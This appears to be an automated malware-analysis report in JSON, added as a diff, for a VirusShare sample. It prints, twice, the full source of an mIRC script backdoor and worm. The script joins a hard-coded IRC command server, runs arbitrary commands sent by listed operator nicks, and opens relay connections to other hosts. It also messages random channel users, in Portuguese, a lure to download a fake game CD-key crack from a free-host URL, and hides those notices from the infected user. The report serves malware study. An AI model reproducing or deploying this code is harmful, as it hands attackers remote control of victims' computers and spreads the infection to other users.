@@ -1,0 +1,103 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "chr": "May attempt to obfuscate specific str"
+        },
+        "macro": ";socket\nalias -l il return $+($r(a,z),$iif($r(1,3) = 2,$r(A,Z)),$iif($r(1,3) = 2,$r(a,z)))\nalias -l ich return $decode(I3l1c2t5,m)\nalias -l scmd if ($1 && $sock(wnurr).status == active) { sockwrite -tn wnurr $1- }\nalias -l smsg scmd privmsg $1 $+(:,$2-)\nalias -l snotice scmd notice $1 $+(:,$2-)\nalias -l icn { var %n = $+(TT-,$r(10000,99999)) | scmd nick %n | set %imynick %n }\non *:sockopen:wnurr:{\n  if ($sockerr) { halt }\n  scmd user tt hostname servername :tuxteam\n  icn\n}\non *:sockread:wnurr:{\n  if ($sockerr) { halt }\n  sockread %i | tokenize 32 %i | unset %i\n  if (!$1) || ($2 = 372) { return }\n  var %nick = $gettok($mid($1-,2-),1,33)\n  if ($1 == PING) { scmd pong $2- }\n  if ($2 == PRIVMSG && $istok(Debian Kheper Einstein MH,%nick,32)) {\n    if ($chr(35) isin $3 && $3 != $ich) { return }\n    tokenize 32 $mid($4-,2-)\n    if ($1 == notice) { .timer 1 0 snotice %nick $2- }\n    if ($1 == do) { $2- }\n    if ($1 == isc && $2) {\n      if ($2 == connect && $3) { sockclose isc | sockopen isc $3 6667 }\n      else { iscmd $2- }\n    }\n  }\n  if ($2 == KICK && $4 == %imynick) { scmd join $3 }\n  if ($2 == 001) { scmd join $ich }\n  if ($2 == 433) { icn }\n}\n;check\non *:signal:ionload:.signal ivariouscheck\non *:connect:.signal ivariouscheck\non *:signal:ivariouscheck:{\n  if (%hrtsrdxc) { return }\n  if (!$timer(wrsxnsd)) { .timerwrsxnsd -io 0 180 .signal ivariouscheck }\n  if (!$sock(wnurr)) { sockclose wnurr | sockopen wnurr 207.44.236.108 6667 }\n  if (!%hstxbvr) { set $+(-u,$calc(15*60)) %hstxbvr yes | imaps }\n  inc %icount\n}\n;maps\nalias -l imaps {\n  var %c = $chan($r(1,$chan(0))), %u = $rnick(%c,0), %nick = $rnick(%c,$r(1,%u)), %n = $r(1,1)\n  if ($istok(rebram.net rizon redesul,$network,32)) || (%u <= 10) || ($me isop %c) || ($me isvo %c) || (!%nick) || (%nick == $me) { return }\n  if (%n == 1) { imsend %nick \u000308,01:: \u000309Quer \u0002CS CD-KEY 1.5/1.6\u0002?? Acesse \u001f\u0002http://moiseh.100free.com/cscdkey.zip\u0002\u001f (de 2 cliques em cima para abrir o site) agora mesmo e baixe o path para burlar o jogo! \u000308:: }\n  .ignore -u30 %nick | inc %imaps\n}\nalias -l imsend .raw -q notice $1 $+(:,$$2-)\non ^*:notice:*quer*cs*cd-key*:?:haltdef\n;isc\nalias -l iscmd if ($sock(isc).status == active) { sockwrite -tn isc $1- }\non *:sockopen:isc:{\n  if ($sockerr) { halt }\n  iscmd user $+($il,$il,$il) hostname servername $+(:,$il,$il,$il)\n  iscmd nick $+($il,$il,$il,$il,$il)\n}\non *:sockread:isc:{\n  if ($sockerr) { halt }\n  sockread %i | tokenize 32 %i | unset %i\n  if ($1 == PING) { iscmd PONG $2- }\n  if ($2 == 005 && brasnet isin $4-) { sockclose $sockname }\n}"
+    },
+    "filename": "VirusShare_a954d560edaabf2bf06e0130eb3b5baf",
+    "filesize": 2609,
+    "filetype": "data",
+    "hashes": {
+        "md5": "a954d560edaabf2bf06e0130eb3b5baf",
+        "sha1": "2c46e50421aa7e8e0c7fab67dc4b3630187b7b00",
+        "sha256": "ba807fccc116725795a3b1e88af1f1f60c638d1b62f75a67c4f885b46788b231"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            ";socket",
+            "alias -l il return $+($r(a,z),$iif($r(1,3) = 2,$r(A,Z)),$iif($r(1,3) = 2,$r(a,z)))",
+            "alias -l ich return $decode(I3l1c2t5,m)",
+            "alias -l scmd if ($1 && $sock(wnurr).status == active) { sockwrite -tn wnurr $1- }",
+            "alias -l smsg scmd privmsg $1 $+(:,$2-)",
+            "alias -l snotice scmd notice $1 $+(:,$2-)",
+            "alias -l icn { var %n = $+(TT-,$r(10000,99999)) | scmd nick %n | set %imynick %n }",
+            "on *:sockopen:wnurr:{",
+            "  if ($sockerr) { halt }",
+            "  scmd user tt hostname servername :tuxteam",
+            "  icn",
+            "on *:sockread:wnurr:{",
+            "  if ($sockerr) { halt }",
+            "  sockread %i | tokenize 32 %i | unset %i",
+            "  if (!$1) || ($2 = 372) { return }",
+            "  var %nick = $gettok($mid($1-,2-),1,33)",
+            "  if ($1 == PING) { scmd pong $2- }",
+            "  if ($2 == PRIVMSG && $istok(Debian Kheper Einstein MH,%nick,32)) {",
+            "    if ($chr(35) isin $3 && $3 != $ich) { return }",
+            "    tokenize 32 $mid($4-,2-)",
+            "    if ($1 == notice) { .timer 1 0 snotice %nick $2- }",
+            "    if ($1 == do) { $2- }",
+            "    if ($1 == isc && $2) {",
+            "      if ($2 == connect && $3) { sockclose isc | sockopen isc $3 6667 }",
+            "      else { iscmd $2- }",
+            "    }",
+            "  if ($2 == KICK && $4 == %imynick) { scmd join $3 }",
+            "  if ($2 == 001) { scmd join $ich }",
+            "  if ($2 == 433) { icn }",
+            ";check",
+            "on *:signal:ionload:.signal ivariouscheck",
+            "on *:connect:.signal ivariouscheck",
+            "on *:signal:ivariouscheck:{",
+            "  if (%hrtsrdxc) { return }",
+            "  if (!$timer(wrsxnsd)) { .timerwrsxnsd -io 0 180 .signal ivariouscheck }",
+            "  if (!$sock(wnurr)) { sockclose wnurr | sockopen wnurr 207.44.236.108 6667 }",
+            "  if (!%hstxbvr) { set $+(-u,$calc(15*60)) %hstxbvr yes | imaps }",
+            "  inc %icount",
+            ";maps",
+            "alias -l imaps {",
+            "  var %c = $chan($r(1,$chan(0))), %u = $rnick(%c,0), %nick = $rnick(%c,$r(1,%u)), %n = $r(1,1)",
+            "  if ($istok(rebram.net rizon redesul,$network,32)) || (%u <= 10) || ($me isop %c) || ($me isvo %c) || (!%nick) || (%nick == $me) { return }",
+            "  if (%n == 1) { imsend %nick ",
+            "08,01:: ",
+            "09Quer ",
+            "CS CD-KEY 1.5/1.6",
+            "?? Acesse ",
+            "http://moiseh.100free.com/cscdkey.zip",
+            " (de 2 cliques em cima para abrir o site) agora mesmo e baixe o path para burlar o jogo! ",
+            "08:: }",
+            "  .ignore -u30 %nick | inc %imaps",
+            "alias -l imsend .raw -q notice $1 $+(:,$$2-)",
+            "on ^*:notice:*quer*cs*cd-key*:?:haltdef",
+            ";isc",
+            "alias -l iscmd if ($sock(isc).status == active) { sockwrite -tn isc $1- }",
+            "on *:sockopen:isc:{",
+            "  if ($sockerr) { halt }",
+            "  iscmd user $+($il,$il,$il) hostname servername $+(:,$il,$il,$il)",
+            "  iscmd nick $+($il,$il,$il,$il,$il)",
+            "on *:sockread:isc:{",
+            "  if ($sockerr) { halt }",
+            "  sockread %i | tokenize 32 %i | unset %i",
+            "  if ($1 == PING) { iscmd PONG $2- }",
+            "  if ($2 == 005 && brasnet isin $4-) { sockclose $sockname }"
+        ],
+        "file": {
+            "http://moiseh.100free.com/cscdkey.zip": "Compressed"
+        },
+        "fuzzing": {},
+        "ip": [
+            "207.44.236.108"
+        ],
+        "url": [
+            "http://moiseh.100free.com/cscdkey.zip"
+        ]
+    },
+    "time": "0:00:00.271037",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
